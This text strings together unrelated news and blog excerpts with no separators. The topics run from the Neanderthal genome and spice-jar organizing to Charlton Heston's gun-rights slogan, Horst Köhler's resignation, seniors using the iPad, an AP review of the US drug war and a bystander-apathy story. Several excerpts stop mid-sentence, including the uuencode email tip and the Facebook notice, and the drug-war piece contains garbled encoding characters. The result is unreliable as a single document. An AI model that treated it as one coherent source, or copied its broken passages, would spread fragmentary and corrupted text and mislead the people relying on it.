A year ago , Pääbo and his team announced that they had largely sequenced the Neanderthal genome .
During the process of comparing it to that of modern humans , they decided to sequence the genomes of five modern individuals from France , Africa , China and Papua New Guinea in the south Pacific .
It was by comparing the Neanderthal sequence with these genomes that the group was able to surmise how and where the Neanderthals had interbred with modern humans around 45,000 to 80,000 years ago .

Examining the five contemporary genomes , they saw Neanderthal genetic regions in the three genomes of modern humans who had migrated across Europe or Asia , but not in the genomes of the two African populations : the San from southern Africa and the Yoruba from western Africa .
This suggests that Neanderthals bred outside Africa with Homo sapiens , who migrated out of that region about 100,000 years ago .
On the basis of the fossil record of human migrations , the team proposes that this took place in the eastern Mediterranean .
Therefore , they say , modern humans from Europe and Asia are closer genetically to Neanderthals than are those from sub-Saharan Africa .
This agrees with the findings of a separate study presented at a conference last month .
That study examined 2,000 modern human genomes that showed two interbreedings with Neanderthals : the first about 60,000 years ago , also in the eastern Mediterranean , and then again about 45,000 years ago in eastern Asia ( see ' Neanderthals may have interbred with humans ' ) .
" They found exactly what we saw in our study , " says Jeffrey Long , a genetic anthropologist from the University of New Mexico in Albuquerque , who was part of the team that presented the findings last month .
" I call it molecular stratigraphy . "
Under pressure
Using the Neanderthal genome for comparison , Pääbo and his colleagues were also able to identify genes that occur frequently in modern humans , suggesting that such genes are the result of selection pressure .
The report notes genes that affect metabolism , cognition and skeletal development show similar signs of such positive selection in modern humans .
And there was positive selection for three genes , that when mutated , have been implicated in Down syndrome , autism and schizophrenia1 .
The Neanderthal draft genome provides " a powerful method to shine a light on our evolutionary history " , says Green — a technique that will reveal the genomic regions and genes that are keys to our human identity .
There are a few standard ways to acquire spices .
The usual involves buying a new spice now or then when you need it for some new recipe .
Or perhaps acquiring a “ set of spices ” with a built in organizer system .
These obviously work , but are prone to being expensive , disorganized , or subject to artificial limits .
Obviously , a more optimal solution exists .
We set out to create a better , backwards compatible , scalable spice organization system so that you do n’t feel silly adding another 20 or 30 or 40 items to your palette .
The default method of acquiring spices at the supermarket leaves you with a collection like this .
Short , tall , skinny , fat , easy to read , hard to read .
The wraparound labels provide plenty of room for branding , but do n’t let you see how much is left .
Many are significantly overpriced .
Some have necks that do n’t fit measuring spoons .
Some have badly designed shaker caps , or worse , a choice between shake and scoop .
And sometimes they ’re just plain ugly .
A unified set of bottles that are worth buying on their own merits can go a long way toward fixing these problems and save you money while doing so .
This 16 jar set from Amazon is appealing on several levels .
The jars are that familiar spice jar size and will fit in a variety of standard spice shelves .
They come with ( optional ) shaker inserts in a couple of hole sizes , and sturdy screw on lids .
The jars are very plain , with no label to obscure the spices .
They are a convenient shape for using a measuring spoon .
The white caps are easy to write on with a permanent marker .
An example is shown up above in comparison to some of the other standard jars–it ’s the empty one in the middle .
Another option are 1 /2 pint mason jars , which also provide a handy place on the lid for labeling .
They ’re a little larger , so they take up more room , but they ’re always available for expanding your collection .
If you do n’t use many spices , but use them in quantity , this is definitely the way to go .
Switching to your own jars is an easy first step because you do n’t necessarily have to buy anything besides the jars .
Your old spices will fit and it will encourage you to refill them rather than buy another mismatched jar .
It will also make it easier to add new spices as you go–there ’s no artificial limit on your set size .
One of those issues that we mentioned is that commercial labels tend to obscure the contents .
When you make your own , you can do it right .
Where to put the label depends on how you use your jars .
If you keep them in your kitchen drawer , then writing on the lids with a permanent marker is clear and quick and cheap .
If you put them on your shelf , it ’s helpful to write on a white label .
To take it up a notch , thermal label printers are readily available and make it easy to print up a whole heap of easy to read , reasonably durable labels .
Avery now sells polyester laser printable labels with extra sticky adhesive for the ultimate in permanence .
The ones shown are paper thermal labels .
If you do print your own sheets of labels , one thing to consider would be printing extra labels for things you hope to acquire someday .
That ’s also one of the biggest reasons to consider your own labels : you wo n’t be tempted to stick with a predetermined set .
One time at a Safeway , we saw a little jar of clove powder for 21 dollars .
That seemed pretty silly since we had just purchased a pound of the stuff for 3 dollars the week before .
So , if you look at the spice section , and it feels like extortion , there really are alternatives .
Now the clove powder is an extreme example , but here ’s a giant 2 dollar bag of red chili flakes from our local Indian market , about a factor of 8 cheaper by weight and a couple dollars cheaper in absolute terms than the same thing at our supermarket .
You ’ll find similar price differences on most mainstream “ American ” spices available from a variety of sources , including Indian and asian markets , as well as restaurant supply outlets or buying clubs like Costco .
( Hint : you may need to do some language research . ) Some items , like saffron , are more expensive than others .
But even then , you might be surprised how much your dollar gets at a good middle eastern grocery .
You may not have a local Indian , and middle eastern , and asian market , but you definitely do online .
It ’s not necessary to have your whole stock of spice on display .
For that stuff you use lots of , or bought a pound of –just because it was cheaper–keep a backup stash in a drawer or cupboard .
Store the excess in larger jars or zipper bags until you ’re ready to refill .
The 1970 ’s remodel on this kitchen included a little spice shelf above the stove , which is handy for the most commonly used spices .
Tiered spice shelves like these are a nice way of being able to see more of your stash ( we do n’t have a particular one to recommend , but it seems like there are a lot out there ) .
How to actually organize your spices is a tricky question .
If you have enough to require the dewey decimal system , you ’re welcome to use it .
For most people , organizing by type of spice ( Indian , Italian , Thai ) or by Brownian motion is sufficient , and your biggest question is shelf or drawer .
A few commenters have expressed their worry about the lifetime of spices in clear jars , especially in the heat of a kitchen or in sunlight .
The best approach is to fill up your spice jars with an amount that you ’ll actually use in a couple of months , and keep the “ drawer supply ” of each spice– a necessary part of this method –sealed in a cool and dry container in a dark drawer .
EDITOR ’S NOTE :
The recent deadly school shooting in Santa Fe , Texas , not long after the school shooting in Parkland , Florida , reminded me of the context of Charlton Heston ’s first notable use of his famous / infamous quote “ From my cold , dead hands . ”
It was in a speech at an NRA meeting held a few months after the 1989 Stockton , California schoolyard shooting , in which dozens of children were killed and wounded by a lunatic armed with a semi-automatic rifle .
Heston used those words in other speeches after that , including one on May 20 , 2000 that gained even wider attention because he aimed them at Democratic presidential candidate Al Gore .
If Heston were still around , I suspect he would still be using the same defiant catchphrase to oppose any restrictions on guns in this country today , despite how many lives they have been used to take since 1989 .
* * * * * * * * * *
For most of his life , Charlton Heston was best known for his long , highly successful career as an actor .
He appeared in more than 100 films , including some of Hollywood ’s biggest blockbusters .
By the late 1980s , his movie career was starting to wane .
But his prominence as a Second Amendment gun rights activist was just beginning .
During the ‘ 60s , Heston had publicly supported Democratic politicians and liberal causes .
He marched with Martin Luther King , Jr. at civil rights events , supported labor union activities , and endorsed gun control legislation , such as President Lyndon Johnson ’s Gun Control Act of 1968 .
As he got older , Heston became increasingly conservative .
He became a supporter of Republican candidates , like Barry Goldwater and Ronald Reagan , and spoke out against “ political correctness . ”
He also became an active , high - profile supporter of the National Rifle Association and its political efforts to block gun control laws .
In the 1980s , Heston appeared in NRA ads and direct mail campaigns .
In 1998 , he was elected President of the NRA .
He served in that role until 2003 .
It was during his years as a prominent NRA supporter that Heston popularized the gun rights slogan : “ From my cold , dead hands . ”
Those words became his most widely - known non-movie quotation .
He is even sometimes credited with coining it .
But he did n't .
It ’s based on previous slogans used by gun rights groups as early as the mid-1970s .
For example , an old NRA bumper sticker Heston was well aware of said : “ I ’ll give you my gun when you take it from my cold , dead hands . ”
It was a catchy way of suggesting that gun owners were willing to literally fight to the death to prevent the government from “ taking away their guns . ”
Charlton Heston first used the last five words of the bumper sticker line in a notable public forum on April 29 , 1989 , at the NRA ’s annual convention in St. Louis .
Three months before that , on January 17 , 1989 , an unemployed welder named Patrick Edward Purdy had used a semi-automatic rifle to shoot and kill five school children and wound 32 others on the playground at the Cleveland Elementary School in Stockton , California .
This shocking and , at the time , still rare example of a mass school shooting generated a media firestorm .
It soon led to calls for state and federal action to ban semi-automatic weapons .
In his speech at the NRA ’s April 29 , 1989 convention , Heston argued that proposals for such bans were sparked by “ media bias ” against guns and would be unworkable , unacceptable infringements on the Second Amendment rights of American citizens .
After Heston finished the speech , he was presented with a silver - and - gold plated replica of a flintlock rifle , as a sign of appreciation from the NRA .
Smiling happily , Heston held up the gun and said : “ I have only one more comment to make : From my cold , dead hands . ”
Heston later used “ From my cold , dead hands ” in other speeches at NRA events , usually as part of his closing lines .
One particularly high - profile use was in the speech he gave at the NRA ’s May 20 , 2000 annual convention , which came during the 2000 presidential campaign and garnered considerable media attention .
In that speech , Heston criticized Democratic presidential candidate Al Gore for his support of stronger gun control laws .
At the end , he lifted the flintlock he was given in 1989 over his head and said :
“ As we set out this year to defeat the divisive forces that would take freedom away , I want to say those fighting words for everyone within the sound of my voice to hear and to heed , and especially for you , Mr. Gore : ‘ From my cold , dead hands ! ’ ”
“ From my cold , dead hands ” has continued to be a favorite slogan of gun rights advocates — and a target of mockery by gun control advocates .
It has also spawned numerous take - offs and variations involving things other than guns .
Some of my favorite examples are listed in the post on my QuoteCounterquote.com site at this link .

Israel is planning to permanently station a submarine carrying nuclear cruise missiles in the Persian Gulf , thereported on Sunday .
Israeli submarines have visited the Gulf before , but the decision has now been taken to ensure a permanent presence of at least one of the vessels .
The paper claims that the government has decided to station at least one of three submarines armed with nuclear missiles permanently within striking distance of Iran in the Persian Gulf .
According to the article the submarines are moving to the Persian Gulf in respone to the growing missile threat to Israel from Syria , Iran and Hizbullah .
Israeli submarines are known to periocially visit the area but this is the first report that they may be permanently stationed there .
The diesel powered submarines are Dolphin class and were built in Germany to Israeli specifications .

A Turkish pop singer has set a new world speed record for an unaccompanied blind person .
Metin Senturk drove a Ferrari at an average speed of 181 miles an hour at an airport in eastern Turkey .
He was followed in another car by former rally driver Volkan Isik , who gave him instructions through an earpiece inside his helmet .
THE powers of the German president are more symbolic than real , but Horst Köhler 's sudden resignation from the job on Monday May 31st was nonetheless a bombshell .
He quit days after critics accused him of violating the spirit of the constitution in remarks he made about German military operations abroad .
His accusers “ flouted the necessary respect for my office , ” said a tearful Mr Köhler .
His premature departure , the first by a post - war president well before the end of his term , piles additional pressure on the coalition government led by Angela Merkel , which is already beleaguered by sagging popular support and the crisis in the euro area .
How she proceeds in the search for a successor will say much about how she means to manage Germany during the coalition 's three remaining years in office .
Mr Köhler , a former director of the International Monetary Fund , had been floundering for some time .
As a non-politician he lacked influence in Berlin 's backrooms .
Earlier presidents had made their mark by rising to historical occasions with ringing oratory .
Despite his financial expertise Mr Köhler struggled to find his voice during the economic crisis .
The markets had become a “ monster , ” he told a magazine in May .
Hurled sporadically his thunderbolts fizzled .
Recently , the press has been giving more coverage to infighting and resignations among his aides than to anything Mr Köhler has had to say .
He remained popular but his prestige was ebbing .
Then came his comments on military deployment , during a visit to Afghanistan .
A “ country of our size with an export orientation ” must sometimes send its armed forces “ to defend our interests , for example open trade routes , ” he said in an interview .
To most Germans the war is tolerable , if at all , only on the grounds of national defence .
Mr Köhler seemed to be offering an economic justification , an affront to their instinctive pacifism .
“ The constitution permits no economic wars , ” thundered one opposition politician .
Mr Köhler claimed he had been misinterpreted but such accusations stung .
His allies , themselves trying to keep their distance from an unpopular war , offered a tepid defence .
Mr Köhler 's sudden resignation — with immediate effect — seemed petulant .
Mrs Merkel now has a problem .
She engineered his first election in 2004 along with Guido Westerwelle , head of the liberal Free Democratic Party ( FDP ) and now foreign minister as well .
That helped to form a partnership between the FDP and Mrs Merkel 's Christian Democratic Union ( CDU ) , which became Germany 's governing coalition after last September 's federal elections .
But the coalition has had a rocky start .
On May 9th its two constituent parties lost power in elections in North Rhine - Westphalia ( NRW ) , the most populous state .
That cost the duo a majority in the Bundesrat , the upper house of parliament .
Mr Köhler 's departure is another blow to the “ Christian - liberal ” project .
A federal assembly now has 30 days to elect a new president .
Even after the NRW election the CDU and FDP may still command a majority of the body , which consists of all members of the Bundestag , the legislature 's lower house , plus an equal number of representatives from the states .
But Mrs Merkel may not think it politic to push through a candidate against resistance from the opposition .
After losing in NRW and dragooning unwilling taxpayers into a rescue of the euro , she may prefer to court consensus rather than conflict .
If that is the case , she will start by backing a president that Germans of all political persuasions can rally round .

In a sharp departure from the abstinence - only message of the Bush years , the new health law pours hundreds of millions of dollars into sex education programs that aim to provide teenagers with comprehensive information about protecting themselves from pregnancy and sexually transmitted diseases .
The programs , to be financed by $ 375 million in grants to the states over five years , are meant to encourage teenagers to delay sexual activity but to use protection if they are already active — as half of all high school students are .
Lessons on healthy relationships , financial literacy and other life skills are also woven into the program , called PREP for Personal Responsibility Education Program .
By contrast , while abstinence - only curriculums may discuss contraceptives and condoms , they emphasize their risks and failure rates , and avoid touching on homosexuality or abortion , said Valerie Huber , executive director of the National Abstinence Education Association .
Critics of that approach are delighted with the new law .
“ The fact that you have the federal government committed to this and putting some money behind it is really significant , ” said Laurie Rubiner , vice president for public policy and advocacy at the Planned Parenthood Federation of America .
“ For years , the only thing offered by the federal government was money for programs that were proven to be unsuccessful in the area of sex education .
I often find myself wanting to email someone an attachment of some sort – PDF , doc , jpg , or whatever .
As a rule I ’ll do this by scping it to the machine I use for mail ( or uploading to gmail ) , but I ’d far rather save time with a command - line oneliner .
Tip of the Trade : Uuencode is a command - line oneliner that saves you time by piping attachments directly into the mail command .
Enter uuencode , which allows you to pipe attachments directly into the mail command .
Here ’s a basic example :
uuencode article.pdf article.pdf | mail -s " Here 's that article " juliet@earth.li
The -s option to mail sets the subject line .
Note that you must give the filename twice .
If you give it only once , the image will not actually be sent , and mail will wait until you hit Ctrl - D to return to the command line .
It will then send the rest of the email , but without the attachment .
This is because the first filename is read as the label for the attachment ( i.e. , it assumes - o ) , and the default is for uuencode to read from stdin .
Without a second filename , it will try to send , as an attachment , whatever you type before you hit Ctrl - D .
This means you could do this :
uuencode text . txt | mail -s " Testing text " juliet@earth.li
Then , type a bunch of text in before hitting Ctrl - D , and it would be sent as a text file .
However , a better way to do this is to save your text file , then use :
This has gotta make you wonder if the employees Facebook hires to screen the site 's profiles and fan pages are actually paying attention .
Openly gay writer Frank Anthony Polito created a Facebook profile in 2008 in support of his novel BAND FAGS !
It took Facebook two years to find that they have issues with the profile 's content .
The social networking giant has removed the page and sent Polito the following message , which reads in part : " You created a Page that has violated our Terms of Use .
A Facebook Page
is a distinct presence used solely for business or promotional
purposes .
Among other things ,
Pages that are hateful , threatening , or
obscene are not allowed .
We also take down Pages that attack an

Kenneth in the ( 212 ) has published a statement from Polito :
" While I understand that the word " fag " is offensive to some
individuals , I find it ridiculous for Facebook to deem my fan page a
" violation " of terms without further looking into matters .
This is
clearly a violation against me as a gay author .
I would contact Facebook with regards to this matter , but they make it
next to impossible to contact them regarding ANYTHING on their site . "
Rita Schena , a 78 - year - old retired teacher , is not the kind of person who waits in line for the release of a new tech gadget .
But there she was April 3 , the day the iPad went on sale , queuing up at a Palo Alto Apple store .
She had spent a short time playing with her son's iPad that morning and was instantly smitten .
" I said , ' Oh my God , I have to have one of these , ' " said Schena , who lives in Menlo Park .
It 's too early to get a demographic breakdown of the people who have bought the new tablet computer - more than half a million of which have been sold .
But Apple 's new gizmo appears to be resonating well with older adults , who see the 10 - inch computer as a device that speaks to their particular needs .
Like the Nintendo Wii , which appealed to some seniors with its intuitive , gesture - based interface , the iPad is finding converts among older consumers who usually are not so - called early adopters .
Schena is a good example .
The 1.5 - pound computer is light enough to carry in her backpack but gives her a full - screen experience for reading books and doing e-mail .
She 's even started to play games on her iPad , something she 's never done on computers .
" I love it for all of the things it can do : reading , music , movies , e-mail , " she said .
" I did n't know what it could do at the time I first saw it , but it 's just so appealing . "
Apple positioned the iPad as a revolutionary device that occupies the space between a laptop and a smart phone .
While some derided it as a super - sized iPhone or iPod Touch , many seniors are enticed by its dimensions and ease of use .
Max Baumgarten , editor of ElderGadget.com , a site that caters to seniors interested in technology , said he 's received a growing amount of positive feedback from readers enjoying their iPads .
" I think it goes back to the features that correspond well to the needs of seniors : big screen , easy to use , ergonomically friendly and lightweight , " Baumgarten said .
" I do n't know if it 's a deliberate move by Apple to make a tablet that appeals specifically to seniors , but that 's what they did . "
Apple spokeswoman Natalie Harrison said the company is happy with the way the iPad is selling .
" We 're thrilled at the response ... from customers of all ages , " she said .
Mark Lainer , a 70 - year - old real estate investor from Encino ( Los Angeles County ) , has both a Palm Treo smart phone and an iPod Touch .
But he prefers his iPad for many tasks because of its big bright screen and the ability to adjust the font size .
" I had the iPod Touch , but I did n't use it to see photographs or read books , " Lainer said .
" Having the size of the iPad is a real asset .
It 's the difference between something that sits on my desk and something I really use . "
While many older iPad owners are computer literate , the tablet 's features appear well designed to pull in users who previously have shied away from computers or were limited by disabilities .
Virginia Campbell , a 99 - year - old Lake Oswego , Ore. , resident , earned a modicum of fame when she appeared in a YouTube video with her iPad .
Campbell , who has lived with glaucoma for more than 20 years , had never owned a computer .
The iPad 's touch screen allows her to get up close and make out letters , something she can't do on a printed page or even an Amazon Kindle .
And with its ability to input text , the iPad has revived Campbell 's dormant interest in poetry .
She 's written dozens of poems , as well as a note to Steve Jobs thanking him for the iPad .
" With glaucoma , it 's like reading in a fog .
But with the iPad , I can see because of the strong contrast between the printed words and the lighted background , " Campbell said .
" I can't emphasize how important this is for people with limited vision . "
Not every senior is as enamored with their iPad as Campbell .
Harold Lischner , 85 , of Cupertino bought one at his wife 's urging .
But he 's been slow to use it because it still feels a little complicated .
" It 's fancy to use , " said the retired doctor .
" There 's a lot of seemingly simple things on it , but I do n't do them normally so I have to learn it . "
Mary Elizabeth O'Conner , a 73 - year - old tech - support freelancer in Cupertino , said she thinks the iPad is better suited than traditional computers to reach basic users .
The iPad 's design , she said , rewards people with direct , intuitive actions .
" The non -tech - savvy users want something simple , to push an icon and get your e-mail and go online , " said O'Conner , who plans on buying an iPad in the coming weeks .
" With the iPad , people do n't feel intimidated by it . "

After 40 years , the United States ’ war on drugs has cost $ 1 trillion and hundreds of thousands of lives , and for what ?
Drug use is rampant and violence even more brutal and widespread .
Even U.S. drug czar Gil Kerlikowske concedes the strategy has n’t worked .
“ In the grand scheme , it has not been successful , ” Kerlikowske told The Associated Press .
“ Forty years later , the concern about drugs and drug problems is , if anything , magnified , intensified . ”
ADVERTISEMENT
This week President Obama promised to “ reduce drug use and the great damage it causes ” with a new national policy that he said treats drug use more as a public health issue and focuses on prevention and treatment .
Nevertheless , his administration has increased spending on interdiction and law enforcement to record levels both in dollars and in percentage terms ; this year , they account for $ 10 billion of his $ 15.5 billion drug - control budget .
Kerlikowske , who coordinates all federal anti-drug policies , says it will take time for the spending to match the rhetoric .
“ Nothing happens overnight , ” he said .
“ We ’ve never worked the drug problem holistically .
We ’ll arrest the drug dealer , but we leave the addiction . ”
His predecessor , John P. Walters , takes issue with that .
ADVERTISEMENT
Walters insists society would be far worse today if there had been no War on Drugs .
Drug abuse peaked nationally in 1979 and , despite fluctuations , remains below those levels , he says .
Judging the drug war is complicated : Records indicate marijuana and prescription drug abuse are climbing , while cocaine use is way down .
Seizures are up , but so is availability .
“ To say that all the things that have been done in the war on drugs have n’t made any difference is ridiculous , ” Walters said .
“ It destroys everything we ’ve done .
It ’s saying all the people involved in law enforcment , treatment and prevention have been wasting their time .
It ’s saying all these people ’s work is misguided . ”

In 1970 , hippies were smoking pot and dropping acid .
Soldiers were coming home from Vietnam hooked on heroin .
Embattled President Richard M. Nixon seized on a new war he thought he could win .

“ This nation faces a major crisis in terms of the increasing use of drugs , particularly among our young people , ” Nixon said as he signed the Comprehensive Drug Abuse Prevention and Control Act .
The following year , he said : “ Public enemy No. 1 in the United States is drug abuse .
In order to fight and defeat this enemy , it is necessary to wage a new , all - out offensive . ”
His first drug - fighting budget was $ 100 million .
Now it ’s $ 15.1 billion , 31 times Nixon ’s amount even when adjusted for inflation .

Using Freedom of Information
Act requests , archival records , federal budgets and dozens of interviews with leaders and analysts , the AP tracked where that money went , and found that the United States repeatedly increased budgets for programs that did little to stop the flow of drugs .
In 40 years , taxpayers spent more than :
_ $ 20 billion to fight the drug gangs in their home countries .
In Colombia , for example , the United States spent more than $ 6 billion , while coca cultivation increased and trafficking moved to Mexico Ã¢â‚¬â€  and the violence along with it .
_ $ 33 billion in marketing “ Just Say No” - style messages to America ’s youth and other prevention programs .
High school students report the same rates of illegal drug use as they did in 1970 , and the Centers for Disease Control and Prevention says drug overdoses have “ risen steadily ” since the early 1970s to more than 20,000 last year .

_ $ 49 billion for law enforcement along America ’s borders to cut off the flow of illegal drugs .
This year , 25 million Americans will snort , swallow , inject and smoke illicit drugs , about 10 million more than in 1970 , with the bulk of those drugs imported from Mexico .
_ $ 121 billion to arrest more than 37 million nonviolent drug offenders , about 10 million of them for possession of marijuana .
Studies show that jail time tends to increase drug abuse .
_ $ 450 billion to lock those people up in federal prisons alone .
Last year , half of all federal prisoners in the U.S. were serving sentences for drug offenses .
At the same time , drug abuse is costing the nation in other ways .
The Justice Department estimates the consequences of drug abuse Ã¢â‚¬â€ “ an overburdened justice system , a strained health care system , lost productivity , and environmental destruction ” Ã¢â‚¬â€ cost the United States $ 215 billion a year .

Harvard University economist Jeffrey Miron says the only sure thing taxpayers get for more spending on police and soldiers is more homicides .
“ Current policy is not having an effect of reducing drug use , ” Miron said , “ but it ’s costing the public a fortune . ”

From the beginning , lawmakers debated fiercely whether law enforcement Ã¢â‚¬â€  no matter how well funded and well trained Ã¢â‚¬â€ could ever defeat the drug problem .
Then - Alaska Sen . Mike Gravel , who had his doubts , has since watched his worst fears come to pass .

“ Look what happened .
It ’s an ongoing tragedy that has cost us a trillion dollars .
It has loaded our jails and it has destabilized countries like Mexico and Colombia , ” he said .
In 1970 , proponents said beefed - up law enforcement could effectively seal the southern U.S. border and stop drugs from coming in .
Since then , the U.S. used patrols , checkpoints , sniffer dogs , cameras , motion detectors , heat sensors , drone aircraft Ã¢â‚¬â€  and even put up more than 1,000 miles of steel beam , concrete walls and heavy mesh stretching from California to Texas .
None of that has stopped the drugs .
The Office of National Drug Control Policy says about 330 tons of cocaine , 20 tons of heroin and 110 tons of methamphetamine are sold in the United States every year Ã¢â‚¬â€ almost all of it brought in across the borders .
Even more marijuana is sold , but it ’s hard to know how much of that is grown domestically , including vast fields run by Mexican drug cartels in U.S. national parks .
The dealers who are caught have overwhelmed justice systems in the United States and elsewhere .
U.S. prosecutors declined to file charges in 7,482 drug cases last year , most because they simply did n’t have the time .
That ’s about one out of every four drug cases .
The United States has in recent years rounded up thousands of suspected associates of Mexican drug gangs , then turned some of the cases over to local prosecutors who ca n’t make the charges stick for lack of evidence .
The suspects are then sometimes released , deported or acquitted .
The U.S. Justice Department does n’t even keep track of what happens to all of them .

In Mexico , traffickers exploit a broken justice system .
Investigators often fail to collect convincing evidence Ã¢â‚¬â€ and are sometimes assassinated when they do .
Confessions are beaten out of suspects by frustrated , underpaid police .
Judges who no longer turn a blind eye to such abuse release the suspects in exasperation .
In prison , in the U.S. or Mexico , traffickers continue to operate , ordering assassinations and arranging distribution of their product even from solitary confinement in Texas and California .
In Mexico , prisoners can sometimes even buy their way out .
The violence spans Mexico .
In Ciudad Juarez , the epicenter of drug violence in Mexico , 2,600 people were killed last year in cartel - related violence , making the city of 1 million across the Rio Grande from El Paso , Texas , one of the world ’s deadliest .
Not a single person was prosecuted for homicide related to organized crime .
And then there ’s the money .

The $ 320 billion annual global drug industry now accounts for 1 percent of all commerce on the planet .
A full 10 percent of Mexico ’s economy is built on drug proceeds Ã¢â‚¬â€ $ 25 billion smuggled in from the United States every year , of which 25 cents of each $ 100 smuggled is seized at the border .
Thus there ’s no incentive for the kind of financial reform that could tame the cartels .
“ For every drug dealer you put in jail or kill , there ’s a line up to replace him because the money is just so good , ” says Walter McCay , who heads the nonprofit Center for Professional Police Certification in Mexico City .
McCay is one of the 13,000 members of Medford , Mass . - based Law Enforcement Against Prohibition , a group of cops , judges , prosecutors , prison wardens and others who want to legalize and regulate all drugs .

A decade ago , no politician who wanted to keep his job would breathe a word about legalization , but a consensus is growing across the country that at least marijuana will someday be regulated and sold like tobacco and alcohol .
California voters decide in November whether to legalize marijuana , and South Dakota will vote this fall on whether to allow medical uses of marijuana , already permitted in California and 13 other states .
The Obama administration says it wo n’t target marijuana dispensaries if they comply with state laws .

Mexican President Felipe Calderon says if America wants to fix the drug problem , it needs to do something about Americans ’ unquenching thirst for illegal drugs .
Kerlikowske agrees , and Obama has committed to doing just that .

And yet both countries continue to spend the bulk of their drug budgets on law enforcement rather than treatment and prevention .
“ President Obama ’s newly released drug war budget is essentially the same as Bush ’s , with roughly twice as much money going to the criminal justice system as to treatment and prevention , ” said Bill Piper , director of national affairs for the nonprofit Drug Policy Alliance .
“ This despite Obama ’s statements on the campaign trail that drug use should be treated as a health issue , not a criminal justice issue . ”
Obama is requesting a record $ 15.5 billion for the drug war for 2011 , about two thirds of it for law enforcement at the front lines of the battle : police , military and border patrol agents struggling to seize drugs and arrest traffickers and users .
About $ 5.6 billion would be spent on prevention and treatment .
“ For the first time ever , the nation has before it an administration that views the drug issue first and foremost through the lens of the public health mandate , ” said economist and drug policy expert John Carnevale , who served three administrations and four drug czars .
“ Yet … it appears that this historic policy stride has some problems with its supporting budget . ”
Carnevale said the administration continues to substantially over - allocate funds to areas that research shows are least effective Ã¢â‚¬â€ interdiction and source - country programs Ã¢â‚¬â€ while under - allocating funds for treatment and prevention .
Kerlikowske , who wishes people would stop calling it a “ war ” on drugs , frequently talks about one of the most valuable tools they ’ve found , in which doctors screen for drug abuse during routine medical examinations .
That program would get a mere $ 7.2 million under Obama ’s budget .
“ People will say that ’s not enough .
They ’ll say the drug budget has n’t shifted as much as it should have , and granted I do n’t disagree with that , ” Kerlikowske said .
“ We would like to do more in that direction . ”
Fifteen years ago , when the government began telling doctors to ask their patients about their drug use during routine medical exams , it described the program as one of the most proven ways to intervene early with would - be addicts .
“ Nothing happens overnight , ” Kerlikowske said .

Until 100 years ago , drugs were simply a commodity .
Then Western cultural shifts made them immoral and deviant , according to London School of Economics professor Fernanda Mena .
Religious movements led the crusades against drugs :
In 1904 , an Episcopal bishop returning from a mission in the Far East argued for banning opium after observing “ the natives ’ moral degeneration . ”
In 1914 , The New York Times reported that cocaine caused blacks to commit “ violent crimes , ” and that it made them resistant to police bullets .
In the decades that followed , Mena said , drugs became synonymous with evil .
Nixon drew on those emotions when he pressed for his War on Drugs .
“ Narcotics addiction is a problem which afflicts both the body and the soul of America , ” he said in a special 1971 message to Congress .
“ It comes quietly into homes and destroys children , it moves into neighborhoods and breaks the fiber of community which makes neighbors .
We must try to better understand the confusion and disillusion and despair that bring people , particularly young people , to the use of narcotics and dangerous drugs . ”
Just a few years later , a young Barack Obama was one of those young users , a teenager smoking pot and trying “ a little blow when you could afford it , ” as he wrote in “ Dreams From My Father . ”
When asked during his campaign if he had inhaled the pot , he replied : “ That was the point . ”
So why persist with costly programs that do n’t work ?
Department of Homeland Security Secretary Janet Napolitano , sitting down with the AP at the U.S. Embassy in Mexico City , paused for a moment at the question .
“ Look , ” she says , starting slowly .
“ This is something that is worth fighting for because drug addiction is about fighting for somebody ’s life , a young child ’s life , a teenager ’s life , their ability to be a successful and productive adult .
“ If you think about it in those terms , that they are fighting for lives Ã¢â‚¬â€  and in Mexico they are literally fighting for lives as well from the violence standpoint Ã¢â‚¬â€  you realize the stakes are too high to let go . ”

Good Samaritan Left for Dead on City Sidewalk Homeless man was stabbed when he intervened , then he collapsed .
April 25 , 2010  --
Why did passersby leave a Good Samaritan bleeding to death on a New York sidewalk last week , with one even pausing to snap a photo of the dying man who had been stabbed after thwarting a mugging ?
A psychologist believes there could be several reasons why people did n't offer to help Hugo Alfredo Tale - Yax , 31 -- whose fate was captured on a grainy surveillance video -- perhaps including our culture 's desensitization to violence from so much exposure in movies , video games and music .
" We love violence in this culture , " said the psychologist , Michael Bradley .
" We have this kind of 24/7 pounding of violence .
We now know that that pounding of violence actually causes brain changes where people start to not distinguish between real violence and cyberviolence .
We 're actually rewiring our brains to not react to violence and pain the way we should . "
Tale - Yax 's death started playing out just after 5:30 a.m. on a Queens , N.Y. , sidewalk last Sunday , April 18 .
On the surveillance video , a woman is followed by a man , who then appears to accost her .
Tale - Yax walks toward them .
What can't be seen is him being stabbed several times in the torso while trying to save the woman .
Within seconds , the camera captures the apparent attacker running away .
Authorities say the woman fled from her assailant .
Tale - Yax , who was homeless , starts to chase the attacker but then collapses .
A minute later , a potential good Samaritan walks right by .
And so does the next person and the one after that .
A procession of more than 20 people seem to notice and fail to help .
One man pulls out his cell phone , but instead of dialing 911 , he snaps a picture .
Another man nudges Tale - Yax , rolls him over twice , seems to see blood , but then walks away .
For nearly an hour and a half , Tale - Yax lay there until someone finally called for help .
Firefighters arrived at 7:23 a.m .
Bradley said there are several explanations for why passersby may not have taken action .
For one thing , he said , people tend to copy the behavior of others , so if one person ignored the injured man , then others were likely to do the same thing .
People also think it 's someone else 's responsibility to intervene , so they wo n't do anything because they assume another person will call for help .
Some reports also have noted that it is not unusual to see individuals passed out or sleeping in public in New York .
N.Y. Is n't First City Where Bystanders Ignore Injured Man
Sadly , what that New York security camera captured has been seen before .
In Seattle in January , a 15 - year - old girl was brutally beaten , knocked unconscious and robbed by a group of teenagers while three security guards stood by and watched .
In Hartford , Conn. , a 78 - year - old man was hit by a car as he crossed a street in 2008 .
The driver never stopped .
A total of 10 vehicles drove by as he laid in the middle of the road , bleeding from the head .
And in Washington , D.C. , in 2003 , a man was shot at a gas station .
Instead of calling for help , the witness finished pumping kerosene into a can , paid and drove off .
The cycle of apathy can be broken starting by teaching children to grow up to be compassionate adults , psychologist Bradley said .
He suggested exposing them to new people or situations through community service and helping them to think critically about news stories such as the incident in New York .
" We have to show our kids caring , empathy and involvement , " he said .
" You do n't have to be a hero .
You do n't have to jump into the fight .
Just push three buttons . "
That is , 911 .
Once again , we get to see just how broken our stock market is , one which takes no prisoners , and will trample over everyone and everything as the Primary Dealers use your own money against you to shake every single person out .
A 130 point move in the Dow in the matter of minutes on no volume is about all you need to know to lose all confidence in stocks , and call up TD Ameritrade and close your account ( you wo n't be allowed to trade when the market is crashing anyway ) .
Good thing we had a fake rumor in the morning to prevent an all out rout into Friday with the Dow looking to open well into 9000 .
